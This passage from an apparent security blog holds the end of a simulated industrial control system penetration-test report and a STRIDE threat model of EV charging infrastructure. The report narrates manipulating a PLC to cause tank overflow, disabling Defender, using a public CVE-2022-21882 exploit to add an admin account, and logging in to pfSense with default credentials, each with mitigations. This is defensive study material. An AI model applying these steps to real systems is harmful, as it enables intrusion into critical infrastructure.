right, although the console output itself is not visible, this meansthat the script has successfully connected to the PLC, written thespecified bit to `True`, and then disconnected.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image41.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image42.png" class=""><p>Figure 27: .py Script Content &amp; Output.</p><p>By manipulating the PLC, we can control the draining process of the water tank in an industrial control environment, potentially leading to an uncontrolled overflow of water in the tank.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/tank.png" class=""><h3 id="Exploitation-Mitigations-5"><a href="#Exploitation-Mitigations-5" class="headerlink" title="Exploitation &amp; Mitigations"></a>Exploitation &amp; Mitigations</h3><p>PLC spoofing occurs when an attacker impersonates a legitimate PLC orinjects false data into the communication channel, thereby misleadingoperators or higher-level systems. In an environment where protocolslike Snap7 or Modbus are used without robust authentication, an attackercan craft packets that mimic valid PLC responses. This approach mighttrick the HMI into displaying incorrect sensor readings, causeunauthorized actuation of outputs, or prevent real alarms from beingtriggered. Spoofing can also be combined with a denial-of-servicetactic, where the legitimate PLC is taken offline, leaving the maliciousnode as the sole data source.</p><p>The key to preventing PLC spoofing is the use of secure protocols andstrong authentication mechanisms. Whenever possible, industrialprotocols should support encryption and integrity checks so that data intransit cannot be tampered with or impersonated. Certificate-basedauthentication is also recommended, as it verifies both client andserver, thus reducing the likelihood of an attacker successfully posingas a legitimate device. Beyond secure protocols, network segmentationplays a critical role in limiting an intruder’s reach; isolating PLCs onrestricted subnets and configuring VLANs or strict firewall rulesensures that only authorized engineering workstations or SCADA serverscan communicate with critical control devices. In addition, devicewhitelisting and continuous network monitoring help identify unusualtraffic patterns or spoofed MAC&#x2F;IP pairs, thereby thwarting attempts atunauthorized access or command injection.</p><h2 id="Window-privilege-escalation"><a href="#Window-privilege-escalation" class="headerlink" title="Window privilege escalation"></a>Window privilege escalation</h2><h3 id="Vulnerabilities-Identification-5"><a href="#Vulnerabilities-Identification-5" class="headerlink" title="Vulnerabilities Identification"></a>Vulnerabilities Identification</h3><p>IP: 172.20.1.100 is win10 pro, we found that its version has localprivilege escalation vuln, which is CVE-2022-21882. We stop the windowsdefender first, and download the exp from github.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image43.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image44.png" class=""><p>Figure : Stop defender and search the useful CVE from GitHub(<a href="https://github.com/KaLendsi/CVE-2022-21882">https://github.com/KaLendsi/CVE-2022-21882</a>).</p><p>By leveraging this vuln, attacker can execute windows command with theSYSTEM privilege. We tried to add a admin user in the system in Figure29.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image45.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image46.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image47.png" class=""><p>Figure : Proof of getting system privilege and add account.</p><p>Then we add admin user into the administrators group in Figure 30.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image48.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image49.png" class=""><p>Figure : proof of adding user into administrators group.</p><p>The process above shows that attacker can do anything in the machinewith the STSTEM privilege, which can lead a big problem in the whole OTsystem.</p><h3 id="Exploitation-Mitigations-6"><a href="#Exploitation-Mitigations-6" class="headerlink" title="Exploitation &amp; Mitigations"></a>Exploitation &amp; Mitigations</h3><p><strong>1. Keep system update:</strong> Ensure Windows and all installed software areup to date with the latest security patches to mitigate vulnerabilitiesthat allow privilege escalation.</p><p><strong>2. Install EDR in local machine:</strong> EDR can detect and response somemalicious actions, not just based on the signature.</p><h2 id="DNS-default-password"><a href="#DNS-default-password" class="headerlink" title="DNS default password"></a>DNS default password</h2><h3 id="Vulnerabilities-Identification-6"><a href="#Vulnerabilities-Identification-6" class="headerlink" title="Vulnerabilities Identification"></a>Vulnerabilities Identification</h3><p>IP: 172.20.1.1, which is gateway of the 172.20.1.0&#x2F;24, and it installsthe firewall system based on the information collection at thebeginning. We found that this firewall system panel uses the defaultpassword: admin&#x2F;pfsense, which can let attacker change any configurationin the panel.</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image50.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image51.png" class=""><p>Figure 31: pfsense panel and proof of default account&amp;&amp;password</p><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image52.png" class=""><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image53.png" class=""><p>Figure 32: pfsense panel and proof of changing the configurations</p><h3 id="Exploitation-Mitigations-7"><a href="#Exploitation-Mitigations-7" class="headerlink" title="Exploitation &amp; Mitigations"></a>Exploitation &amp; Mitigations</h3><p><strong>1.Change Default Credentials Immediately：</strong> Upon initial setup, changethe default administrator username and password to a strong, uniquecombination.</p><p><strong>2. Use Strong Password Policies：</strong> Enforce complex passwords with atleast 12 characters, including uppercase and lowercase letters, numbers,and special characters.</p><p><strong>3. Implement Multi-Factor Authentication (MFA)：</strong> Require MFA forfirewall administrative access to add an extra layer of security beyondjust a password</p><p><strong>4.Use Role-Based Access Control (RBAC)：</strong> Assign different privilegelevels to users based on their job roles, ensuring that only authorizedpersonnel have administrative access.</p><h1 id="Indicator-of-Compromise"><a href="#Indicator-of-Compromise" class="headerlink" title="Indicator of Compromise"></a>Indicator of Compromise</h1><p>In an ICS environment, an Indicator of Compromise (IOC) is anysign—digital or physical—that suggests the network, or its deviceshave been breached or are actively under attack. Over the course ofthese assessments, several vulnerabilities were found, ranging fromWindows SMB exposures (EternalBlue) and public camera feeds tomisconfigured PLCs and posted credentials. Each of these vulnerabilitiescan generate specific signals that, if monitored correctly, will helpdetect malicious activity in its early stages.</p><h2 id="Publicly-displayed-credentials"><a href="#Publicly-displayed-credentials" class="headerlink" title="Publicly displayed credentials"></a>Publicly displayed credentials</h2><p>One of the most striking vulnerabilities we observed was the presence ofpublicly displayed credentials. If these credentials belong to anengineering workstation or any device with administrative privileges, itbecomes alarmingly easy for an attacker to gain remote access. The firstIOC here would be unexpected login attempts from unusual IP addresses orat odd hours on the engineering workstation. Since the password isopenly accessible, malicious actors need not rely on brute force; theycan simply use the known combination. Logs revealing successful loginsfrom IP ranges outside the facility’s typical geographic boundaries orfrom segments of the network that rarely communicate with theengineering workstation would be a major red flag. Additionally, iflegitimate users suddenly lose access or experience locked-out accounts,it may indicate that an attacker has hijacked those credentials andchanged passwords to maintain control.</p><h2 id="The-EternalBlue-MS17-010-Exploit"><a href="#The-EternalBlue-MS17-010-Exploit" class="headerlink" title="The EternalBlue (MS17-010) Exploit"></a>The EternalBlue (MS17-010) Exploit</h2><p>The EternalBlue (MS17-010) vulnerability was discovered on Windows 7hosts such as 172.20.1.70 and 172.20.50.160. Indicators of anEternalBlue compromise typically include unusual SMB traffic—forinstance, a spike in malformed SMB packets, or repeated connections toport 445 from internal hosts that normally do not communicate on thatport. Security logs might also reveal memory corruption or references toprocesses like “DoublePulsar” in advanced forensic traces. If anattacker has successfully exploited EternalBlue, subsequent IOCs couldinvolve the creation of unauthorized local accounts, the presence ofsuspicious services, or the system spawning remote shells outside normalusage patterns. By monitoring SMB logs and employing intrusion detectionsystems tailored to ICS networks, defenders can catch these anomaliesbefore the attacker can escalate privileges across the environment.</p><h2 id="Unauthorized-Surveillance"><a href="#Unauthorized-Surveillance" class="headerlink" title="Unauthorized Surveillance"></a>Unauthorized Surveillance</h2><p>Open or poorly protected camera feeds, such as the one observed at172.20.1.30:9081, present a risk of unauthorized surveillance. Repeatedattempts to access or stream from the camera feed—particularly fromunknown IP addresses or during non-standard operational hours—serve asstrong indicators of compromise. System logs that record multiple HTTP401 (Unauthorized) or 403 (Forbidden) responses may point to brute-forceor reconnaissance activities targeting the camera interface.Furthermore, if the logs show successful logins that cannot be matchedwith known users or if access originates from IPs not associated withauthorized personnel, this strongly suggests that the camera feed isvulnerable and may be compromised. Immediate attention to securing thesefeeds is necessary to prevent unauthorized data access and potentialprivacy breaches.</p><h2 id="The-PLC-and-HMI-Misconfigurations"><a href="#The-PLC-and-HMI-Misconfigurations" class="headerlink" title="The PLC and HMI Misconfigurations"></a>The PLC and HMI Misconfigurations</h2><p>Misconfigurations in PLC and HMI settings, particularly within the TIAPortal environment for S7-1200 controllers, pose significant securityrisks. Any unexpected changes to project files, user managementconfigurations, or protection settings should be considered a potentialindicator of unauthorized modifications. Unapproved alterations in PLClogic or sudden shifts in user account access levels, such as an”Everybody” group gaining write privileges, may indicate that anattacker is attempting to compromise the device. Additionally, recurrent”Connection failed” messages in system logs could suggest attempts toguess or override PLC credentials. In environments where auto-updates orremote management are enabled, unplanned reboots or firmware updates mayalso signal covert tampering. It is essential to implement stringentaccess controls and continuous monitoring to promptly detect andremediate these risks.</p><p>Overall, an effective IOC strategy must tie each recognizedvulnerability to specific red flags in network traffic, logs, orphysical environment changes. By diligently monitoring foranomalies—whether they manifest as repeated SMB connections,unauthorized HMI logins, or suspicious updates to PLCfirmware—security teams can detect intrusions swiftly and minimizedamage. Employing robust logging, strict authentication policies, andcontinuous staff training amplifies these efforts. Only by maintainingawareness of the potential compromise signs, consistently analyzinglogs, and understanding normal operational baselines can ICS operators’thwart threats in real time. The ultimate goal is to transform everydiscovered vulnerability into a well-defined set of IOCs that, oncetriggered, sets off an immediate and decisive security response.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This experiment report provides a comprehensive assessment of thesecurity posture within a simulated ICS environment. Over the course ofthe two-day exercise, a variety of tools—including Nmap andMetasploit—were utilized to map network assets, identifyvulnerabilities, and attempt exploitation. The analysis revealed severalcritical issues that demand immediate attention.</p><h1 id="REFERENCES"><a href="#REFERENCES" class="headerlink" title="REFERENCES"></a>REFERENCES</h1><p>[1] CVE-2017-0144 : the SMBv1 server in Microsoft windows vista SP2;windows server 2008 SP2 and R2: 2017.<em><a href="https://www.cvedetails.com/cve/CVE-2017-0144/">https://www.cvedetails.com/cve/CVE-2017-0144/</a></em>. Accessed: 2025-03-14.</p><p>[2] Microsoft security bulletin MS17-010 - critical: 2023.<em><a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010</a></em>.Accessed: 2025-03-14.</p><p>[3] Rekhter, Y. et al. 1996. <em>RFC1918: address allocation for privateinternets</em>. RFC Editor.</p><h2 id="Appendices"><a href="#Appendices" class="headerlink" title="Appendices"></a>Appendices</h2><img src="/2025/07/02/Penetration-testing-of-industrial-control-systems/image54.png" class=""><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://pypi.org/project/python-snap7">https://pypi.org/project/python-snap7</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>工控安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Electric Vehicle Charging Threat Modeling on Smart Grid</title>
    <link href="/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/"/>
    <url>/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/</url>
    
    <content type="html"><![CDATA[<h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>This article is part of my ICS security research and analyzes the security risks in smart car scenarios based on the following background research.</p><p><a href="/files/case_study.pdf">下载 PDF</a></p><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>The rapid development of the electric vehicle industry promotes theinstallations of the private and public EVCS (Electric Vehicle ChargingStation). This kind of equipment connect critical infrastructure such asthe power grid and transportation, which makes them become an importantfactor of the whole society. It is also because of its diversity ofconnections and functions such as cloud management services, third-partyservices, electric vehicle and power grids, which makes it morevulnerable to various types of cyber-attacks and can cause significantsocial impacts. In this paper, we systematically analyze the security ofEV charging systems in a smart grid environment, with a focus on theimpact of attacks on the grid.</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Governments worldwide are prioritizing climate change, driving rapid EVmarket growth. Smart transportation is a keyagenda, with European and American policies promoting EV adoption andphasing out full-powered cars. To meet rising demand, EVCSs areexpanding quickly.</p><p>The ecosystem’s interaction with multiple services and protocolsincreases complexity and attack surfaces. Charging equipment suppliersintegrate various technologies, enabling remote management,user-friendly services, and energy scheduling. CMS (Cloud ManagementServices) allows mobile-controlled charging, increasing spoofing andtampering risks. Third-party services like navigation and billing handlepersonal data, heightening exposure to informationleaks.</p><p>While suppliers focus on functionality, security is often overlooked,leading to vulnerabilities in APPs, firmware, and communications.Meanwhile, power grids, as critical infrastructure, face risks fromcoordinated EV charging and dischargingattacks.</p><p>In this paper, we focus on a basic architecture of the public and homeEVCS, and analyze its risks from different aspects such ascommunication, firmware, application, supply chains, physical devices,Etc. We also provide some detection methods and mitigation measures ofeach attack.</p><p>The remainder of this article is organized as follows. In Section 2, weintroduce the charging ecosystem architecture and some basic concepts.In Section 3, we conduct risk analysis and illustrate the possibleimpacts of attacks based on the system we describe in Section 2. InSection 4, we provide some methods for detection and describe where theyshould be deployed within the system. In Section 5, we discuss somesecurity measures to defend against these attacks and. In Section 6, wediscuss some measures for enhancing system resilience and makeconclusion in In Section 7.</p><h1 id="System-Architecture-and-Analysis"><a href="#System-Architecture-and-Analysis" class="headerlink" title="System Architecture and Analysis"></a>System Architecture and Analysis</h1><h2 id="System-architecture"><a href="#System-architecture" class="headerlink" title="System architecture"></a>System architecture</h2><p>The following figure are drawn based on the description of case study.</p><img src="/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/sys_arch.png" class=""><p>The whole ecosystem can be divided into three parts:</p><p><strong>1.Cloud services (Grid cloud, charging cloud and other clouds):</strong> Provide services of data storages and data communication and mobilemanagement and control from the applications.</p><p><strong>2.Power grid:</strong> Maintain the power supply to the EVCSs.</p><p><strong>3.EVCS:</strong> Supply power to EVs, authenticate users and cars and recordpower usage.</p><h2 id="Procedure-analysis"><a href="#Procedure-analysis" class="headerlink" title="Procedure analysis"></a>Procedure analysis</h2><p>In this part, we will discuss the work procedure of this system.</p><p><strong>From Home EVCS:</strong></p><p>1. User registers and logins to the charger app deployed in thecharging provider cloud and bind the car with the EVCS equipment.</p><p>2. User plugs the cable in the car, which can transmit the carinformation by VIN code over the CAN protocol.</p><p>3. User starts charging by APP then power comes from distribution boardand can be metered by the smart meter.</p><p>4. Smart meter can have communication with the EVCS equipment and thepower substation to transmit the meter record.</p><p>5. Distribution board can switch the power source to the photovoltaicpanel or feed excess electricity back into the power substation.</p><p>6. EVCS equipment can communicate with the charger provider cloud tosynchronize information and states.</p><p>7. Maintenance engineers can access the EVCS equipment with the accessinterface on the equipment locally.</p><p>8. Operation engineers and administrators can access the cloud platformto manage the charging cloud system.</p><p><strong>From Park EVCS (only discuss differences with the home EVCS):</strong></p><p>1.User registers and logins to the charger app deployed in the chargingmanagement system and navigate a free EVCS equipment and can pay thebill by the app.</p><p>2.Park has a local power distribution station, which supply the power toall the charger equipment and meter the power usage of each EVCSequipment.</p><p>3.Local power distribution station communicates with the chargingmanagement system to synchronize the power usage.</p><p>4.Charging management system communicates with EVCS equipment to controlthe start and stop of charging and synchronize the equipment states.</p><p>5.Charging management system communicates with charger provider cloud tosynchronize chargers’ information.</p><p>6.Operation engineers and administrators can access the cloud platformto manage the third-party system</p><h1 id="Threat-Analysis"><a href="#Threat-Analysis" class="headerlink" title="Threat Analysis"></a>Threat Analysis</h1><p>In this section, we will conduct the threat analysis focusing on keyfactors of this ecosystem such as applications, firmware andcommunication, and include physical and human factors even the threat ofthe power grids based on the STRIDE threatmodeling</p><p>The following picture is the description of meaning of STRIDE modeling,which can be separated into six parts: Spoofing, Tampering, Repudiation,Info disclosure, Denial of service and Elevation of privilege.</p><img src="/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/STRIDE.png" class=""><h2 id="Data-flow-diagram"><a href="#Data-flow-diagram" class="headerlink" title="Data flow diagram"></a>Data flow diagram</h2><p>To clearly present the data interaction model of the entire ecosystem,making it convenient for us to analyze risks in specific scenarios, weabstract various elements and services in Figure 1, and draw them as thefollowing data flow diagram, where red represents core services and bluerepresents core elements.</p><img src="/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/data_flow.png" class=""><p><strong>External entities:</strong> We use rectangles to represent the externalentities, such as users, maintainers and electric vehicle, who interactwith processes.</p><p><strong>Processes:</strong> We use circles to represent the processes, includingmobile application, charging provider cloud service, charging managementsystem, charger embedded system and so on, which provide various kindsof services to external entities or interact with them.</p><p><strong>Data stores:</strong> We use double horizontal lines to represent database,storing data that come from business.</p><p><strong>Data flow:</strong> We use arrows to represent data flow, and the pointing ofarrows represent the direction of the data flow.</p><h2 id="Risk-scopes"><a href="#Risk-scopes" class="headerlink" title="Risk scopes"></a>Risk scopes</h2><p>Due to the complexity of the whole ecosystem, in order to clearlyexpress the risks, we divide risks into different scopes as follows:</p><p><strong>(1) EV to CSE (Charging Supply Equipment) interfaces:</strong> Thecommunication between the EV and the charging embedded system.</p><p><strong>(2) User to EV mobile&#x2F;web application:</strong> The EV user uses thisapplication to navigate, control and pay for the charge.</p><p><strong>(3) CSE to CMS (Charging management system):</strong> The communicationbetween the Charging Supply Equipment and the Charging managementsystem.</p><p><strong>(4) CSE maintenance interface:</strong> The interfaces (USB, serial ports, orother physical ports) on the CSE, used by engineers to debug or test theequipment.</p><p><strong>(5) CSE to SM (Smart meter):</strong> The communication between chargingSupply Equipment and smart meter.</p><p><strong>(6) Cloud services management interface:</strong> The web interfaces of cloudservices (charging provider operator service or third-party cloudservices), used to manage and config the cloud services.</p><p><strong>(7) Cloud to Cloud interfaces:</strong> The communication between differentcloud services, such as API requests or software download.</p><p><strong>(8) EV mobile&#x2F;web application to cloud services:</strong> The communicationbetween cloud services and EV mobile application.</p><p><strong>(9)Smart meter to substation:</strong> Smart meters report meter recodes tothe substation.</p><p><strong>(10)Substation to power grid:</strong> Power grid monitor the states of thesubstations.</p><p><strong>(11)Grid operation cloud to power grid:</strong> Grid operation cloud cancontrol and monitor the power grid remotely.</p><h2 id="Risk-analysis"><a href="#Risk-analysis" class="headerlink" title="Risk analysis"></a>Risk analysis</h2><h3 id="Remote-charging-session-hijacking"><a href="#Remote-charging-session-hijacking" class="headerlink" title="Remote charging session hijacking"></a>Remote charging session hijacking</h3><p> <strong>1.Scenario:</strong> Due to the mobile application’s failure to verifyuser ownership of the target vehicle during charging requests and onlychecking whether the user is a legitimate system user, attackers cancontrol valid accounts and attempt unauthorized charging and dischargingoperations on vehicles not belonging to them, thereby taking overcharging sessions of other vehicles.</p><p><strong>2.Flaws:</strong></p><p> <strong>a.Unverified ownership:</strong> Static analysis revealed that users caninitiate control requests to any vehicle connected to the network,indicating that the CMS system lacks a security mechanism to bind andverify the association between users and vehicles, thereby allowingaccess to any vehicle.</p><p> <strong>b.Improper authorization for a critical function:</strong> The controlof key vehicle functions lacks authorization verification, and thecharging and discharging of the vehicle is based solely on the user andcharging device IDs. Therefore, the core functions of charging anddischarging can be taken over by any attacker’s account.</p><p><strong>3.Paths:</strong> 2-8-3-1-5-9-10</p><p><strong>4.Impacts:</strong> Research indicates that when an attacker can control abotnet consisting of thousands of vehicles to perform regular chargingand discharging, it can lead to significant waste of power generationcapacity and increased wear on power generation equipment, resulting insubstantial cost waste. Additionally, it may cause overload intransmission lines and instability in the power grid, potentiallyleading to regional blackouts.</p><h3 id="Firmware-tampering-and-injection"><a href="#Firmware-tampering-and-injection" class="headerlink" title="Firmware tampering and injection"></a>Firmware tampering and injection</h3><p><strong>1.Scenario:</strong> Due to the exposure of EVSE in vulnerableenvironments and the presence of local interfaces, such as USB, providedfor engineers to debug and maintain, if the firmware is not encrypted orsubjected to integrity checks, it can be extracted, tampered with, orimplanted with trojans by attackers.</p><p><strong>2.Flaws:</strong> Lack of physical protection for debugging interfaces, lackof encryption and integrity checks for firmware and data, lack of updatefor firmware, use root privilege to run the process.</p><p><strong>3.Paths:</strong> 4-1-5-9-10</p><p><strong>4.Impacts:</strong> If attackers can control a large number of chargingdevices at the same time, form a botnet, and charge and discharge inbatches to attack the power grid, then the power grid will beoverwhelmed and eventually lead to regional power outages.</p><h3 id="Remote-attacks-to-charging-points"><a href="#Remote-attacks-to-charging-points" class="headerlink" title="Remote attacks to charging points"></a>Remote attacks to charging points</h3><p><strong>1.Scenario:</strong> EVSE uses the OCPP protocol to communicateremotely with CMS, allowing an attacker to act as a man-in-the-middle,eavesdropping on their communication, stealing user information, orconducting a Denial of Service (DoS) attack to disrupt normalcommunication.</p><p><strong>2.Flaws:</strong> Uses a low OCPP version, lower than 2.0</p><p><strong>3.Paths:</strong> 3-5-9-10</p><p><strong>4.Impacts:</strong> Attackers can perform man-in-the-middle attacks to readunprotected or encrypted user plaintext information, resulting in userinformation leakage, and if user information is maliciously used, it maybring economic losses to users. At the same time, if the user accountcan be controlled based on the hijacked user information, then when thenumber of user accounts is large enough, it can launch an attack on thepower grid, and the batch of charging and discharging requests willaffect the stability of the power grid.</p><h3 id="SMS-phishing-attacks-targeting-users"><a href="#SMS-phishing-attacks-targeting-users" class="headerlink" title="SMS phishing attacks targeting users"></a>SMS phishing attacks targeting users</h3><p><strong>1.Scenario:</strong> The attacker sends phishing SMS messages tousers, providing them with incorrect discount information, deceivingthem into collectively charging and discharging at a specific time,thereby directly impacting the power grid.</p><p><strong>2.Flaws:</strong> The weakness of liking to take advantage.</p><p><strong>3.Paths:</strong> 2-8-3-1-5-9-10</p><p><strong>4.Impacts:</strong> Attackers use phishing SMS messages to trick a largenumber of users into charging at the same time, if this time happens tobe in the peak period of electricity consumption, then the expensiveelectricity price will not only cause economic losses to users, so thatthe brand reputation is damaged, in severe cases, it is a hugeadditional burden for the power supply of the grid, if the grid can notwithstand the huge power use, may cause regional power outages.</p><h3 id="Cloud-platform-and-application-intrusion"><a href="#Cloud-platform-and-application-intrusion" class="headerlink" title="Cloud platform and application intrusion"></a>Cloud platform and application intrusion</h3><p> <strong>1.Scenario:</strong> Attackers can enter the cloud management platformthrough web vulnerabilities or incorrect permission configurations totamper with configurations, steal user data, or even hack into systems,plant Trojans in products, and carry out more stealthy supply chainattacks such as updating EVSE firmware by OTA(Over The Air).</p><p><strong>2.Flaws:</strong> OWASP flaws</p><p><strong>3.Paths:</strong> 6-8-2,6-8-3-1-5-9-10,6-7-8-2,6-7-8-3-1-5-9-10,6-7-11</p><p><strong>4.Impacts:</strong> As a management platform, the cloud platform has a highlevel of control authority and is connected to other cloud platforms,such as the network of the power grid. Attackers can obtain a largeamount of user data, which will not only bring user information leakageand economic losses, but also manipulate a large number of users tocharge and discharge at the same time, causing power outages on thepower grid, and can even directly move laterally to the power grid,further invading the power grid and causing incalculable losses.</p><h1 id="Detection-Mechanisms"><a href="#Detection-Mechanisms" class="headerlink" title="Detection Mechanisms"></a>Detection Mechanisms</h1><p>In this section, we will discuss some detection methods for the risksthat we mentioned in the previous section.</p><h2 id="Detection-for-anomalies-in-charging-session"><a href="#Detection-for-anomalies-in-charging-session" class="headerlink" title="Detection for anomalies in charging session"></a>Detection for anomalies in charging session</h2><h3 id="Detect-method"><a href="#Detect-method" class="headerlink" title="Detect method"></a>Detect method</h3><p>To counter attacks like session hijacking, cloud intrusion, and phishingSMS, which enable batch control of vehicle charging, Kern proposes ahybrid intrusion detection method. Combining regression-basedforecasting with anomaly detection, it effectively detects known attackswith a low false positive rate and generalizes well to unknown threats.</p><img src="/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/IDS.png" class=""><p><strong>1.Charging behavior prediction:</strong> Predict the normal behavior patternsof a charging session from historical data. If the actual charging datadeviates from the predicted value, there may be an attack or anomaly.</p><p><strong>2.Anomaly Detection:</strong> Artificial Neural Network (ANN) is used toidentify known attacks by training on existing attack samples. At thesame time, Local Outlier Factor (LOF) is used to detect unknown attacksor novel anomalies.</p><h3 id="Detect-targets"><a href="#Detect-targets" class="headerlink" title="Detect targets"></a>Detect targets</h3><p><strong>1.Data Tampering:</strong> The charging power, current, and voltageare maliciously modified.</p><p><strong>2.Fake Charging Sessions:</strong> Fake charging sessions, stealingelectricity or tricking the billing system.</p><p><strong>3.Load Attacks:</strong> Affect grid stability through abnormal chargingbehavior.</p><h3 id="Deployment-methods"><a href="#Deployment-methods" class="headerlink" title="Deployment methods"></a>Deployment methods</h3><p>This IDS can be deployed in the backend servers of the CMS services,where it can collect all the session data from the EVSEs in parks or athome.</p><h2 id="Detection-for-SMS-phishing-attacks"><a href="#Detection-for-SMS-phishing-attacks" class="headerlink" title="Detection for SMS phishing attacks"></a>Detection for SMS phishing attacks</h2><h3 id="Detection-method"><a href="#Detection-method" class="headerlink" title="Detection method"></a>Detection method</h3><p>In response to the SMS phishing attack, Mehmood propose a kind ofdetection method based on deep learning, which combines convolutionalneural networks (CNNs) and long short-term memory networks (LSTMs) todetect SMS phishing attacks.</p><img src="/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/sms.png" class=""><p><strong>1.Model architecture:</strong> Combining CNN with LSTM, CNN is used toextract local features of SMS content, and then long-term dependenciesin SMS sequences are captured through LSTM.</p><p><strong>2.Performance:</strong> The model achieves an accuracy of 0.9974 in theexperiment, and has high precision, recall, and F1 score, indicatingthat it has excellent performance in detecting smishing attacks andeffectively reduces the false positive rate.</p><h3 id="Deployment-methods-1"><a href="#Deployment-methods-1" class="headerlink" title="Deployment methods"></a>Deployment methods</h3><p>This model can be deployed on the SMS gateway or operator’s server, itscans and filters incoming SMS messages in real time to preventmalicious information from reaching users’ devices.</p><h2 id="Detection-for-cloud-platform-intrusion"><a href="#Detection-for-cloud-platform-intrusion" class="headerlink" title="Detection for cloud platform intrusion"></a>Detection for cloud platform intrusion</h2><h3 id="Detection-method-1"><a href="#Detection-method-1" class="headerlink" title="Detection method"></a>Detection method</h3><p>The basic method is to identify malicious activity by monitoring systemactivity and analysing patterns. HIDS (Host based Intrusion DetectionSystems) and NIDS (Network based Intrusion Detection System) are themost common way to detect attacks. We should combine them together anddeploy them in the cloud environment.</p><img src="/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/HIDS.png" class=""><img src="/2025/06/19/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/NIDS.png" class=""><p><strong>1.HIDS:</strong> Detect intrusions by analyzing operating system logs, fileintegrity, process behavior, registry modifications (Windows), andsystem calls. It identifies attacks primarily through signature-baseddetection and anomaly-based detection.</p><p><strong>2.NIDS:</strong> NIDS listens to and analyzes network traffic, utilizingtraffic pattern analysis (anomaly detection) and signature matching(based on known attack signatures) to detect intrusion activities.Typically employing deep packet inspection (DPI) and traffic statisticalanalysis, NIDS can identify network-level threats such as DDoS attacks,port scanning, and unauthorized access.</p><h3 id="Deployment-methods-2"><a href="#Deployment-methods-2" class="headerlink" title="Deployment methods"></a>Deployment methods</h3><p>HIDS can be deployed in the cloud server, and NIDS can be deployed atthe edge of the network.</p><h1 id="Resilience-Enhancements"><a href="#Resilience-Enhancements" class="headerlink" title="Resilience Enhancements"></a>Resilience Enhancements</h1><p>In this section we will discuss about the mitigation measures for theattacks that we mentioned before based on the power grid and chargingsystem scenarios, not only focusing on the technical methods but alsoincluding policies, management, regulations, and human factors</p><h2 id="Technical-approaches"><a href="#Technical-approaches" class="headerlink" title="Technical approaches"></a>Technical approaches</h2><p><strong>1.Encrypt communication:</strong> Make sure that all thecommunications are encrypted by strong algorithm such as TLS (TransportLayer Security), ensuring that attacker cannot sniff the plaintext datain the middle, which can mitigate the man in the middle attack and stopthe user information leakage</p><p><strong>2.Encrypt data storage:</strong> Make sure that all the data stored indatabases are encrypted by strong algorithm, ensuring that attackerscannot extract any useful data from servers even if the servers arecompromised.</p><p><strong>3.Check firmware integrity and signature:</strong> Make sure that the EVSEfirmware cannot be changed by attackers remotely or locally, which canavoid attacker injecting eval code or conducting supply chain attack.</p><p><strong>4.Turn off unnecessary services on the internet:</strong> Make sure that theservices that are not provided for customers are closed on the internet.Employees can just access them from the internal network or Sec VPN,which can avoid attackers attacking these web services.</p><p>**5.Timely upgrade of architecture and software&#x2F;hardware versions:**Make sure that the protocol, software version, firmware are latestversion, ensuring that all the known vulnerabilities are patched, whichcan avoid attackers leveraging known vulnerabilities to attack.</p><p><strong>6.Use IPS (Intrusion Prevention System) to defend against attack inreal time:</strong> IPS can detect and defend against attacks based onanomalies and signatures, Compared to IDS, which only monitors, IPS candirectly block attacks such as blocking IPs or dropping packets.</p><p><strong>7.Authentication and authorization controls:</strong> Enhance authenticationand authorization control, such as using MFA (Muti-FactorAuthentication) and RBAC (rule-based access control) to make sure thatattackers cannot easily access the system as high privilege.</p><p><strong>8.Physical interface protection:</strong> Make sure that the debug or testinterfaces on the equipment are protected physically, avoiding attackersaccess these interfaces by cable directly.</p><p><strong>9.Abnormal Electricity Usage Detection:</strong> Power suppliers shouldmonitor abnormalities in the charging network and take timely action,such as cutting off a large number of abnormal charging requests tomaintain overall electrical stability.</p><h2 id="Management-approaches"><a href="#Management-approaches" class="headerlink" title="Management approaches"></a>Management approaches</h2><p><strong>1.Conduct security training periodically:</strong> Improvingemployees’ security awareness such as using strong password or identifyphishing emails.</p><p><strong>2.Conduct DevSecOps (secure development and operation) and IR(Incident Response) procedure:</strong> Make sure that the whole processes ofdevelopment are combined with security monitor, discover vulnerabilitiesin advance and have a standard IR procedure, ensuring that containmentmethod are conducted timely when incident happened.</p><p><strong>3.Regular audits and compliance checks:</strong> Make sure all the systemscomply with latest security standards and requirements, such as GDPR,ISO 27001, ISO 